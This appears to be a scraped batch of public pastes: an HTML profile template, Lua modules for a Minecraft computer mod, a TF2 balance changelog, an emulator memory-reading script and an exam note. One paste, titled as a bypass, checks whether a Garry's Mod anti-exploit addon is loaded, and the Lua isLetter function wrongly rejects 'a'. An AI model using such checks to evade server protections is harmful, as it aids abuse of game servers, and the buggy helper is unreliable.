    ""tcqLypxWg"": 1,
    ""iAKkPr"": 1,
    ""kdKtrl"": 1
  },
  ""keyboard"": {
    ""Unknown"": 160
  },
  ""client_build"": {
    ""Unknown"": 160
  },
  ""client_name"": {
    ""Unknown"": 160
  },
  ""ip_type"": {
    ""Unknown"": 64,
    ""mobile"": 4,
    ""hosting"": 74,
    ""proxy"": 4,
    ""hosting & proxy"": 11,
    ""mobile & proxy"": 3
  }
}"
KwSLuF6F,22. cute folder,rosiuel,HTML,Saturday 20th of January 2024 06:10:21 PM CDT,"<!--

    [ 22 | CUTE FOLDER ]
    
    turn OFF WYSIWYG
    turn ON code editor

    use chevrons on the side to stay organized
<- over here

    DO NOT REMOVE CREDIT
    
    ~ RESOURCES ~
    ♡ free live code editor :  https://th.circlejourney.net/
    ♡ coding help forum     :  https://toyhou.se/~forums/16.htmlcss-graphics/48845.-help-thread-ask-your-questions-here-
    ♡ how to edit icons     :  https://toyhou.se/3536712.
    ♡ coding resources      :  https://toyhou.se/Elithian/characters/folder:881832

    ~ COLORS ~
    ♡ accent  : #e690a7
    
    use ctrl+f to quickly change colors

-->

<div class=""mx-auto"" style=""max-width: 600px;"">
    <div class=""card border-0 p-1 bg-faded"">
        <div class=""card border-0 p-2"">
            
            <!-- header -->
            <div
                class=""p-5 card text-center border-0 mb-2 align-items-center justify-content-center""
                style=""
                    background: url(
                    
                    https://images.unsplash.com/photo-1523992038393-d5ab874a077e?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                    
                    ) center no-repeat;
                    background-size: cover;
                ""
            >
                <h1 class=""m-0"" style=""font-size: 3rem; color: #fff; text-shadow: 0 0 10px #000; font-family: Arial;"">
                    <span class=""text-uppercase"">
                        <span style=""color: #e690a7;"">F</span>older
                        <span style=""color: #e690a7;"">N</span>ame
                    </span>
                </h1>
            </div>
            <!-- end header -->

            <div class=""row no-gutters"">
                
                <!-- nav -->
                <div class=""col-lg mr-lg-2 mb-lg-0 mb-2"">
                    <ul class=""nav nav-pills flex-column h-100"">
                        <!-- 01 -->
                        <li class=""nav-item mb-2 h-100"">
                            <a
                                href=""#warnings""
                                class=""nav-link active btn btn-default align-items-center justify-content-center h-100""
                                data-toggle=""tab""
                                style=""color: #fff; background: #e690a7; border: 1px solid #e690a7; box-shadow: none;""
                            >
                                <i class=""fa-light fa-warning fa-2x""></i>
                            </a>
                        </li>

                        <!-- 02 -->
                        <li class=""nav-item mb-2 h-100"">
                            <a href=""#intro"" class=""nav-link btn btn-default align-items-center justify-content-center h-100"" data-toggle=""tab"" style=""color: #fff; background: #e690a7; border: 1px solid #e690a7; box-shadow: none;"">
                                <i class=""fa-light fa-info-circle fa-2x""></i>
                            </a>
                        </li>

                        <!-- 03 -->
                        <li class=""nav-item mb-2 h-100"">
                            <a href=""#locals"" class=""nav-link btn btn-default align-items-center justify-content-center h-100"" data-toggle=""tab"" style=""color: #fff; background: #e690a7; border: 1px solid #e690a7; box-shadow: none;"">
                                <i class=""fa-light fa-building fa-2x""></i>
                            </a>
                        </li>

                        <!-- 04 -->
                        <li class=""nav-item h-100"">
                            <a href=""#characters"" class=""nav-link btn btn-default align-items-center justify-content-center h-100"" data-toggle=""tab"" style=""color: #fff; background: #e690a7; border: 1px solid #e690a7; box-shadow: none;"">
                                <i class=""fa-light fa-users fa-2x""></i>
                            </a>
                        </li>
                    </ul>
                </div>
                <!-- end nav -->

                <!-- content -->
                <div class=""col-lg-10"">
                    <div class=""tab-content text-justify"">
                        
                        <!-- warnings -->
                        <div id=""warnings"" class=""tab-pane fade active show"" style=""height: 300px;"">
                            <div class=""h-100 flex-column"">
                                <!-- header -->
                                <div class=""card border-0 p-3 bg-faded text-center"">
                                    <h1 class=""m-0"">
                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>

                                        GENERAL WARNINGS

                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>
                                    </h1>
                                </div>

                                <!-- text // this box scrolls -->
                                <div class=""h-100 text-justify my-2 overflow-auto"">
                                    <p>
                                        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et
                                        velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                    </p>

                                    <!-- add more above here -->
                                </div>

                                <!-- end text -->

                                <div class=""h-100 text-center"">
                                    <!-- warnings -->
                                    <div class=""flex-row no-gutters"" style=""overflow-x: auto; font-size: 10px;"">
                                        
                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-skull fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Death
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-pills fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Drugs
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-heart fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Sexual Themes
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-hand fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Gore
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-tint fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Blood
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-star fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Bright Colors
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- warning -->
                                        <div class=""col card bg-faded border-0 p-3 align-items-center mx-1"">
                                            <!-- icon -->
                                            <i class=""fa-solid fa-hand-fist fa-fw fa-3x"" style=""color: #e690a7;""></i>

                                            <hr class=""my-2"" />
                                            <span class=""text-uppercase"">
                                                Abuse
                                            </span>
                                        </div>
                                        <!-- end warning -->

                                        <!-- add more above here -->
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- end warnings -->

                        <!-- intro -->
                        <div id=""intro"" class=""tab-pane fade"" style=""height: 300px;"">
                            <div class=""h-100 flex-column"">
                                <!-- header -->
                                <div class=""card border-0 p-3 bg-faded mb-2 text-center"">
                                    <h1 class=""m-0"">
                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>

                                        INTRODUCTION

                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>
                                    </h1>
                                </div>

                                <!-- quote -->
                                <div class=""py-2 mb-2 text-center"">
                                    <p class=""font-italic"">
                                        <i class=""fa-duotone fa-quote-left fa-fw"" style=""color: #e690a7;""></i>

                                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.

                                        <i class=""fa-duotone fa-quote-right fa-fw"" style=""color: #e690a7;""></i>
                                    </p>
                                </div>

                                <div class=""card border-0 p-3 bg-faded h-100 overflow-auto"">
                                    <p>
                                        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et
                                        velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                    </p>
                                    <p>
                                        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et
                                        velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                    </p>

                                    <!-- add more above here -->
                                </div>
                            </div>
                        </div>
                        <!-- end intro -->

                        <!-- places -->
                        <div id=""locals"" class=""tab-pane fade"" style=""height: 300px;"">
                            <div class=""h-100 flex-column"">
                                <!-- header -->
                                <div class=""card border-0 p-3 bg-faded mb-2 text-center"">
                                    <h1 class=""m-0 kirakira"">
                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>

                                        NOTABLE LOCATIONS

                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>
                                    </h1>
                                </div>

                                <!-- carousel -->
                                <div class=""h-100 overflow-auto"">
                                    <div class=""carousel slide pointer-event h-100"" id=""places"" data-pause=""true"">
                                        <div class=""carousel-inner h-100"">
                                            <!-- make sure your place 1 is the only one with ""active"" or it'll break the carousel -->

                                            <!-- place 1 -->
                                            <div class=""carousel-item active h-100"">
                                                <div class=""row no-gutters h-100"">
                                                    <!-- side image -->
                                                    <div
                                                        class=""col-4 card border-0 h-100""
                                                        style=""
                                                            background: url(
                                                            
                                                            https://images.unsplash.com/photo-1520052205864-92d242b3a76b?q=80&w=2069&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                            
                                                            )
                                                                center no-repeat;
                                                            background-size: cover;
                                                        ""
                                                    ></div>
                                                    <div class=""col card border-0 bg-faded p-3 text-justify ml-lg-2 h-100 overflow-auto"">
                                                        <h3>
                                                            Location Name
                                                        </h3>
                                                        <!-- description -->
                                                        <div class=""text-justify"" style=""line-height: 1.2rem;"">
                                                            <p>
                                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat
                                                                non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                                            </p>
                                                            <!-- add more above here -->
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- end place 1 -->

                                            <!-- place 2 -->
                                            <div class=""carousel-item h-100"">
                                                <div class=""row no-gutters h-100"">
                                                    <!-- side image -->
                                                    <div
                                                        class=""col-4 card border-0 h-100""
                                                        style=""
                                                            background: url(
                                                            
                                                            https://images.unsplash.com/photo-1492171983775-a51717616c0d?q=80&w=2064&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                            
                                                            )
                                                                center no-repeat;
                                                            background-size: cover;
                                                        ""
                                                    ></div>
                                                    <div class=""col card border-0 bg-faded p-3 text-justify ml-lg-2 h-100 overflow-auto"">
                                                        <h3>
                                                            Location Name
                                                        </h3>
                                                        <!-- description -->
                                                        <div class=""text-justify"" style=""line-height: 1.2rem;"">
                                                            <p>
                                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat
                                                                non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                                            </p>
                                                            <p>
                                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat
                                                                non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                                            </p>
                                                            <!-- add more above here -->
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- end place 2 -->

                                            <!-- place 3 -->
                                            <div class=""carousel-item h-100"">
                                                <div class=""row no-gutters h-100"">
                                                    <!-- side image -->
                                                    <div
                                                        class=""col-4 card border-0 h-100""
                                                        style=""
                                                            background: url(
                                                            
                                                            https://images.unsplash.com/photo-1514449372970-c013485804bd?q=80&w=1932&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                            
                                                            )
                                                                center no-repeat;
                                                            background-size: cover;
                                                        ""
                                                    ></div>
                                                    <div class=""col card border-0 bg-faded p-3 text-justify ml-lg-2 h-100 overflow-auto"">
                                                        <h3>
                                                            Location Name
                                                        </h3>
                                                        <!-- description -->
                                                        <div class=""text-justify"" style=""line-height: 1.2rem;"">
                                                            <p>
                                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat
                                                                non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.
                                                            </p>
                                                            <!-- add more above here -->
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- end place 3 -->

                                            <!-- add more above here -->
                                        </div>
                                    </div>
                                </div>

                                <!-- buttons -->
                                <div class=""row no-gutters mt-2"">
                                    <div class=""col mr-3"">
                                        <a href=""#places"" data-slide=""prev"" class=""btn btn-default w-100 p-1"" style=""background: #e690a7; border: 1px solid #e690a7; color: #fff; box-shadow: none;"">
                                            <i class=""fa-light fa-arrow-left fa-fw""></i>
                                        </a>
                                    </div>
                                    <div class=""col"">
                                        <a href=""#places"" data-slide=""next"" class=""btn btn-default w-100 p-1"" style=""background: #e690a7; border: 1px solid #e690a7; color: #fff; box-shadow: none;"">
                                            <i class=""fa-light fa-arrow-right fa-fw""></i>
                                        </a>
                                    </div>
                                </div>
                                <!-- end buttons -->
                            </div>
                        </div>
                        <!-- end places -->

                        <!-- characters -->
                        <div id=""characters"" class=""tab-pane fade"" style=""height: 300px;"">
                            <div class=""h-100 flex-column"">
                                <div class=""card border-0 p-3 bg-faded mb-2 text-center"">
                                    <h1 class=""m-0"">
                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>

                                        CHARACTERS

                                        <i class=""fa-solid fa-heart fa-fw"" style=""color: #e690a7;""></i>
                                    </h1>
                                </div>

                                <!-- carousel -->
                                <div class=""h-100 overflow-auto"">
                                    <!-- character -->
                                    <div class=""row no-gutters my-1"">
                                        <!-- image -->
                                        <div
                                            class=""col-2 card border-0 bg-faded""
                                            style=""
                                                background: url(
                                                
                                                https://images.unsplash.com/photo-1570727624862-3008fe67a6be?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                
                                                ) center
                                                    no-repeat;
                                                background-size: cover;
                                            ""
                                        ></div>
                                        <div class=""col card border-0 bg-faded p-3 mx-2 align-items-center justify-content-center"">
                                            <a href=""CHAR_LINK"" style=""color: #e690a7;""> NAME <i class=""fa-light fa-heart""></i> </a>
                                            <small>
                                                main character
                                            </small>
                                        </div>
                                    </div>
                                    <!-- end character -->

                                    <!-- character -->
                                    <div class=""row no-gutters my-1"">
                                        <!-- image -->
                                        <div
                                            class=""col-2 card border-0 bg-faded""
                                            style=""
                                                background: url(
                                                
                                                https://images.unsplash.com/photo-1570727624862-3008fe67a6be?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                
                                                ) center
                                                    no-repeat;
                                                background-size: cover;
                                            ""
                                        ></div>
                                        <div class=""col card border-0 bg-faded p-3 mx-2 align-items-center justify-content-center"">
                                            <a href=""CHAR_LINK"" style=""color: #e690a7;""> NAME <i class=""fa-light fa-star""></i> </a>
                                            <small>
                                                secondary character
                                            </small>
                                        </div>
                                    </div>
                                    <!-- end character -->

                                    <!-- character -->
                                    <div class=""row no-gutters my-1"">
                                        <!-- image -->
                                        <div
                                            class=""col-2 card border-0 bg-faded""
                                            style=""
                                                background: url(
                                                
                                                https://images.unsplash.com/photo-1570727624862-3008fe67a6be?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                
                                                ) center
                                                    no-repeat;
                                                background-size: cover;
                                            ""
                                        ></div>
                                        <div class=""col card border-0 bg-faded p-3 mx-2 align-items-center justify-content-center"">
                                            <a href=""CHAR_LINK"" style=""color: #e690a7;""> NAME <i class=""fa-light fa-star""></i> </a>
                                            <small>
                                                secondary character
                                            </small>
                                        </div>
                                    </div>
                                    <!-- end character -->

                                    <!-- character -->
                                    <div class=""row no-gutters my-1"">
                                        <!-- image -->
                                        <div
                                            class=""col-2 card border-0 bg-faded""
                                            style=""
                                                background: url(
                                                
                                                https://images.unsplash.com/photo-1570727624862-3008fe67a6be?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
                                                
                                                ) center
                                                    no-repeat;
                                                background-size: cover;
                                            ""
                                        ></div>
                                        <div class=""col card border-0 bg-faded p-3 mx-2 align-items-center justify-content-center"">
                                            <a href=""CHAR_LINK"" style=""color: #e690a7;""> NAME <i class=""fa-light fa-circle""></i> </a>
                                            <small>
                                                background character
                                            </small>
                                        </div>
                                    </div>
                                    <!-- end character -->

                                    <!-- add more above here -->
                                </div>
                            </div>
                        </div>
                        <!-- end characters -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- credit // DO NOT REMOVE -->
    <div class=""text-right"">
        <a href=""https://toyhou.se/25411656.22-cute-folder"" style=""color: #e690a7;"" class=""tooltipster"" title=""code by peachybonnie"">
            <i class=""fa-solid fa-heart fa-xs""></i>
        </a>
    </div>
</div>"
ztdU7hVs,MaanOS/cc:tweaked - string,maanlamp,Lua,Saturday 20th of January 2024 06:03:30 PM CDT,"local String = {};

function String.isLetter (char)
	local code = char:sub(1, 1):byte();
	if (code >= 98 and code <= 122) then
		return true; -- a-z
	elseif (code >= 65 and code <= 90) then
		return true; -- A-Z
	end
	return false;
end;

function String.charAt(str, at)
	return str:sub(at, at);
end

return String;"
UViAHFXZ,Lizard Game,AlphaBanStorage,C#,Saturday 20th of January 2024 05:56:37 PM CDT,"Fitky_austin
Emblazes
Lizard
TheBeastMare"
t2xjBLx7,MaanOS/cc:tweaked - timer,maanlamp,Lua,Saturday 20th of January 2024 05:42:46 PM CDT,"local Event = require(""core.event"");

local Timer = {};

function Timer.duration(f, ms)
	local id = os.startTimer(ms / 1000);
	local function handler(event)
		if (event.args[1] == id) then
			f();
		end
	end
	Event.on(""timer"", handler, { once = true });
	local function clear()
		os.cancelTimer(id);
		Event.off(""timer"", handler);
	end
	return clear;
end

function Timer.periodic(f, ms)
	local id = os.startTimer(ms / 1000);
	local function handler(event)
		if (event.args[1] == id) then
			f();
			id = os.startTimer(ms / 1000);
		end
	end
	Event.on(""timer"", handler);
	local function clear()
		os.cancelTimer(id);
		Event.off(""timer"", handler);
	end
	return clear;
end

function Timer.schedule(f, atHour)
	local id = os.setAlarm(atHour);
	local function handler(event)
		if (event.args[1] == id) then
			f();
		end
	end
	Event.on(""alarm"", handler, { once = true });
	local function clear()
		os.cancelAlarm(id);
		Event.off(""alarm"", handler);
	end
	return clear;
end

return Timer;"
7PBewZVi,BWR - Changelog 20/01/24,SSilver,Diff,Saturday 20th of January 2024 05:41:21 PM CDT,"Detonator
+ Removed self-damage penalty
+ Removed afterburn penalty on splash
Scorch Shot
+ Removed afterburn penalty on splash
Afterburn against groups really wasn't as problematic as previously thought given the timing needed on the Detonator and the delay of the Scorch Shot. The Detonator especially was falling behind in movement potential with the airblast jumps Pyro has, so the self-damage nerf was removed to make the greater jumps this weapon has more desireable.

Iron Bomber
+ Reverted push force to grenade jumping
+ Removed damage penalty from rollers
- Added: -10% damage penalty
- Reverted self damage from grenades
The weapon didn't have serious enough downsides to it. The best that could be figured for a weapon that emphaizes greater roller strength was to give it a direct damage penalty instead. This way the launcher has a more defined niche in being worse against single healthier targets while better against groups crowded groups.

Chargin' Targe
+ Added -33% reduction in push force taken from damage
This shield felt a little left behind, being only really useful in tanking a lot of damage. This change should help the demoman close the gap when engaging in melee and charging in.

Scotsman's Skullcutter
+ Charging is unaffected by speed penalty
A fix to the weapon's speed erroneously impacting how far your charges went.

Syringe Gun
~ Below applies to all unlocks
+ Crit heal recovery increased to -5 seconds on hit (was -3s)
Feedback on syringes showed they could use some speeding up, so it was buffed to make the process smoother, especially when healing a larger group.

Amputator
+ Recreated on-hit effect to prevent it cancelling other healing beams
Fixing a strange behavior with the on-hit effect cancelling other healing sources once it was over, including Quick-Fix's Megaheal and the weapon's own Medicating Melody taunt. This version shouldn't override any extra healing but will be canceled by the healing taunt.

Bazaar Bargain
+ Removed damage penalty
+ Removed base charge rate penalty
- Added -50% charge damage penalty
The nerfing of this weapon made it seem exceptionally less useful even when the snowball was built up for the lowered pick potential without charging. This version gives it a flip to that, making it less useful against healthier targets but being easier to build up the snowball.

The Machina
+ Buildings should be affected by charge damage buff
- Added 25% slower charging speed
The increased charge damage appeared to need a proper counterbalance due to how quickly one could take out higher health targets, so slowing it's charge speed felt appropriate."
jLC1piLn,ganonfloor_dolphin.lua,exodus122,Lua,Saturday 20th of January 2024 05:32:52 PM CDT,"-- modified version of MrCheeze's lua script which was for bizhawk
-- this version is used with Dolphin 5.0-14344 and Cheat Engine lua engine
-- oot version 1.2

ramStart = readPointer(""Dolphin.exe+0xC4DC70"")+0xE74000

function to_signed_32(num) 
    if num > 2147483648 then
        num = num - (2 * 2147483648)
        return num
    else return num
    end
end

function to_signed_16(num) 
    if num > 32768 then
        num = num - (2 * 32768)
        return num
    else return num
    end
end

function read_u32_be(addr)
	val = readInteger(ramStart+addr)
	return ((val & 0xFF) << 24)
           | ((val & 0xFF00) << 8)
           | ((val >> 8) & 0xFF00)
           | ((val >> 24) & 0xFF);
end

function read_s32_be(addr)
	val = readInteger(ramStart+addr)
	newval = ((val & 0xFF) << 24)
           | ((val & 0xFF00) << 8)
           | ((val >> 8) & 0xFF00)
           | ((val >> 24) & 0xFF);
    return to_signed_32(newval)
end

function read_u16_be(addr)
    val = readSmallInteger(ramStart+addr)
	return ((val & 0xFF) << 8)
           | ((val >> 8) & 0xFF);
end

function read_s16_be(addr)
    val = readSmallInteger(ramStart+addr)
	newval = ((val & 0xFF) << 8)
           | ((val >> 8) & 0xFF);
	return to_signed_16(newval)
end

function readbyte(addr)
    return readBytes(ramStart+addr, 1)
end

addr_colCtx = 0x1C9520 -- NTSC 1.2
addr_exitList = 0x1DAB64 -- NTSC 1.2

exitList = read_u32_be(addr_exitList)

colCtx_colHeader = read_u32_be(addr_colCtx)
colCtx_lookupTbl = read_u32_be(addr_colCtx+0x40)
colCtx_polyNodes_tbl = read_u32_be(addr_colCtx+0x48)
colCtx_polyNodes_polyCheckTbl = read_u32_be(addr_colCtx+0x4C)
colCtx_dyna_polyList = read_u32_be(addr_colCtx+0x50+0x13F0)
colCtx_dyna_vtxList = read_u32_be(addr_colCtx+0x50+0x13F4)

colCtx_colHeader_vtxList = read_u32_be(colCtx_colHeader - 0x80000000 + 0x10)
colCtx_colHeader_polyList = read_u32_be(colCtx_colHeader - 0x80000000 + 0x18)
colCtx_colHeader_surfaceTypeList = read_u32_be(colCtx_colHeader - 0x80000000 + 0x1C)

lookup_entry_count = read_s32_be(addr_colCtx+0x1C)*read_s32_be(addr_colCtx+0x20)*read_s32_be(addr_colCtx+0x24)

already_dumped_node_indexes = {}

dyna_polyListMax = read_u32_be(addr_colCtx + 0x50 + 0x1408)
dyna_vtxListMax = read_u32_be(addr_colCtx + 0x50 + 0x140C)

dyna_polyCount = 0
dyna_vtxCount = 0

for i=0,49 do
	if (bAnd(read_u16_be(addr_colCtx + 0x50 + 0x138C + 2*i), 0x0001)) ~= 0 then
		-- bgActor #i is in use
		bgActor_colHeader = read_u32_be(addr_colCtx + 0x50 + 0x4 + 0x64*i + 4)
		
		bgActor_vtxCount = read_u16_be(bgActor_colHeader - 0x80000000 + 0xC)
		dyna_vtxCount = dyna_vtxCount + bgActor_vtxCount

		bgActor_polyCount = read_u16_be(bgActor_colHeader - 0x80000000 + 0x14)
		dyna_polyCount = dyna_polyCount + bgActor_polyCount
	end
end

print(string.format(""%08X colCtx_dyna_vtxList (used=%d/%d)"", colCtx_dyna_vtxList, dyna_vtxCount, dyna_vtxListMax))
if dyna_vtxCount>dyna_vtxListMax then
	vtx_overflow_start = colCtx_dyna_vtxList + 6*dyna_vtxListMax
	vtx_overflow_end = colCtx_dyna_vtxList + 6*dyna_vtxCount
	print(string.format(""!!! dyna vtxList overflow into %08X-%08X !!!"", vtx_overflow_start, vtx_overflow_end))
end
print(string.format(""%08X colCtx_dyna_polyList (used=%d/%d)"", colCtx_dyna_polyList, dyna_polyCount, dyna_polyListMax))
if dyna_polyCount>dyna_polyListMax then
	poly_overflow_start = colCtx_dyna_polyList + 0x10*dyna_polyListMax
	poly_overflow_end = colCtx_dyna_polyList + 0x10*dyna_polyCount
	print(string.format(""!!! dyna polyList overflow into %08X-%08X !!!"", poly_overflow_start, poly_overflow_end))
end
print(string.format(""%08X colCtx_polyNodes_polyCheckTbl"", colCtx_polyNodes_polyCheckTbl))
print(string.format(""%08X colCtx_polyNodes_tbl"", colCtx_polyNodes_tbl))
print(string.format(""%08X colCtx_lookupTbl"", colCtx_lookupTbl))
print(string.format(""%08X exitList"", exitList))
print(string.format(""%08X colCtx_colHeader_surfaceTypeList"", colCtx_colHeader_surfaceTypeList))
print(string.format(""%08X colCtx_colHeader_polyList"", colCtx_colHeader_polyList))
print(string.format(""%08X colCtx_colHeader_vtxList"", colCtx_colHeader_vtxList))
print(string.format(""%08X colCtx_colHeader"", colCtx_colHeader))

for i=0,lookup_entry_count-1 do
	for j=0,1 do -- include floors and walls, but not ceilings
		
		nodeIndex = read_u16_be(colCtx_lookupTbl - 0x80000000 + 6*i + 2*j)
		
		while nodeIndex ~= 0xFFFF and not already_dumped_node_indexes[nodeIndex] do
			polyId = read_u16_be(colCtx_polyNodes_tbl - 0x80000000 + 4*nodeIndex)
			polySurfaceTypeId = read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId)
			surfaceExitIndex = bAnd(readbyte(colCtx_colHeader_surfaceTypeList - 0x80000000 + 8*polySurfaceTypeId + 2), 0x1F)
			
			if (surfaceExitIndex ~= 0) then
			
				exitValue = read_u16_be(exitList - 0x80000000 + 2*(surfaceExitIndex-1))
			
				polyVertIdA = bAnd(read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId + 2), 0x1FFF)
				polyVertIdB = bAnd(read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId + 4), 0x1FFF)
				polyVertIdC = read_u16_be(colCtx_colHeader_polyList - 0x80000000 + 0x10*polyId + 6)
				
				vertAX = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdA + 0)
				vertAY = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdA + 2)
				vertAZ = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdA + 4)
				vertBX = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdB + 0)
				vertBY = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdB + 2)
				vertBZ = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdB + 4)
				vertCX = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdC + 0)
				vertCY = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdC + 2)
				vertCZ = read_s16_be(colCtx_colHeader_vtxList - 0x80000000 + 6*polyVertIdC + 4)
				
				print(string.format(""exit %04X - nodeIndex %04X polyId %04X surfaceType %04X - (%d,%d,%d), (%d,%d,%d), (%d,%d,%d)"", exitValue, nodeIndex, polyId, polySurfaceTypeId, vertAX,vertAY,vertAZ, vertBX,vertBY,vertBZ, vertCX,vertCY,vertCZ))
			end
			
			already_dumped_node_indexes[nodeIndex] = true
			
			nodeIndex = read_u16_be(colCtx_polyNodes_tbl - 0x80000000 + 4*nodeIndex + 2)
		end
	end
end"
X3Xr0L2d,SELF LEAK - BYPASS SNTE (Say No To Exploits) 2024,Sambrifou,Lua,Saturday 20th of January 2024 05:03:25 PM CDT,"if hook.GetTable()[""CanTool""][""SNTE_KILL_BOUNCY_BALL_EXPLOIT""] then 
    print(""<Warning!> SNTE is detected"") 
        else 
    print(""<Warning!> SNTE is not detected"") 
end"
Ha4r2pZk,webinar-python-exam-review-2023-01-20,jspill,Python,Saturday 20th of January 2024 04:59:16 PM CDT,"# Exam Review 2024 Jan 20

# Do those LABS
# Ch 2-14... all Labs!
# Ch 21-32 just ADDITIONAL LABS, but important practice!
